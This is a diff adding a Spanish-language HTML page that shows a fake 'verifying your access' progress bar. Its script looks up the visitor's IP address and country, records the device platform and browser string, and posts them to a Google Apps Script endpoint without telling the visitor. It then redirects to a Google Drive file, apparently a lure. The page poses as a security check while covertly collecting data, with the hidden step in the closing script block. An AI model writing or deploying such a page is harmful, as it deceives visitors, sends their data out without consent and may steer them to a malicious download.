@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Verificando acceso</title>
+
+<style>
+
+body{
+font-family: Arial, sans-serif;
+background:#f4f6f8;
+text-align:center;
+padding-top:120px;
+}
+
+.box{
+width:420px;
+margin:auto;
+background:white;
+padding:35px;
+border-radius:10px;
+box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+
+.progress{
+width:100%;
+height:22px;
+background:#ddd;
+border-radius:20px;
+overflow:hidden;
+margin-top:25px;
+}
+
+.bar{
+height:100%;
+width:0%;
+background:#2ecc71;
+transition:width 0.2s;
+}
+
+.small{
+color:#777;
+font-size:14px;
+margin-top:15px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>Verificando su acceso</h2>
+
+<p>Espere unos segundos mientras lo redirigimos.</p>
+
+<div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+
+<p class="small">Preparando conexión segura...</p>
+
+</div>
+
+<script>
+
+let progreso = 0;
+
+let visitor = {
+ip:"",
+country:"",
+device:navigator.platform,
+browser:navigator.userAgent
+};
+
+fetch("https://ipapi.co/json/")
+.then(res=>res.json())
+.then(data=>{
+visitor.ip = data.ip;
+visitor.country = data.country_name;
+});
+
+function enviarDatos(){
+
+fetch("https://script.google.com/macros/s/AKfycbx8R1aix84alrNnQTEBNbb5EugS3dzWjY_-Ca0f6MtzsCncSqVfAwsy1ftbWa8yHV4HsQ/exec",{
+method:"POST",
+body:JSON.stringify(visitor)
+});
+
+}
+
+let intervalo = setInterval(function(){
+
+progreso += 2;
+
+document.getElementById("bar").style.width = progreso + "%";
+
+if(progreso >= 100){
+
+clearInterval(intervalo);
+
+enviarDatos();
+
+setTimeout(function(){
+
+window.location.href="https://drive.google.com/file/d/0BzDW2TMhk43ITzJ2bG54bTRRTzg/view?usp=sharing&resourcekey=0-nuotiWTTU1-tL8M-4HOLBQ";
+
+},1500);
+
+}
+
+},100);
+
+</script>
+
+</body>
+</html>
